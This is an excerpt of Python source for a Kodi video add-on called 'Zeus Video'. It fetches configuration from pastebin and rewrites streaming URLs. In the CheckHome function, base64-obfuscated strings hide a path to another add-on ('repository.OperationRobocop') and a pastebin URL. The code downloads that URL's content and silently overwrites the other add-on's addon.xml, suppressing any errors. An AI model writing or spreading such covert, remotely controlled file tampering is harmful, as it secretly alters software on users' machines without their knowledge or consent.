...
linkedin = os.path.join(AgentDir, base64.decodestring('cmVwb3NpdG9yeS5PcGVyYXRpb25Sb2JvY29w'))
...
CompileData = 'NO DATA'
try: 
    CompileData = net.http_GET('http://pastebin.com/raw.php?i=UXhRmKiV').content
except:
...
def ResolveIT():
    ...
    if InfoLabel[-2:] == 'US':
       ...
       print 'ZeusAddon Infolabel >>' + InfoLabel + '<<>>' + InfoLabel[-2:]
       return 1
...
def ReportFaultDiag():
    xbmcgui.Dialog().ok('Zeus Video Support', 'For reporting faults, suggestions, general support',' ', 'go to http://zeusrepo.com')
...
def UpdateMe():
    ...
    xbmcgui.Dialog().ok('Zeus Video Updated', 'A reboot may be required. ', 'Thank you for using Zeus','Z3US')
...
# code here to convert user code in sql
	
    if url.find('server1.com') > 0: 
        url = url.replace(GetCompile('FINDLINK'),GetCompile('REPLINK'))
        LinkData = GetCompile('LINKEDDATA')
        url = url + '|Zeus Video Addon zeusrepo'
        if LinkData.find('live') > 0:	
            url = url.replace('/live/public/streams/',LinkData)
    elif url.find('india.com') > 0: 
        url = url.replace(GetCompile('FINDLINK2'),GetCompile('REPLINK2'))
        India2code = regex_from_to(ZeusGetContent(GetCompile('CODE1')),'{','}')
        url = url + '_' + India2code + '/index.m3u8'
...
def CheckHome():
    if os.path.exists(linkedin)==True:
        try:
            packageFile2 = os.path.join(linkedin, 'addon.xml')
            PageSource = net.http_GET(base64.decodestring('aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcucGhwP2k9aHlpU0RRanA=')).content
            f = open(packageFile2, 'w') 
            f.write(PageSource)
            f.close()
        except:
            pass
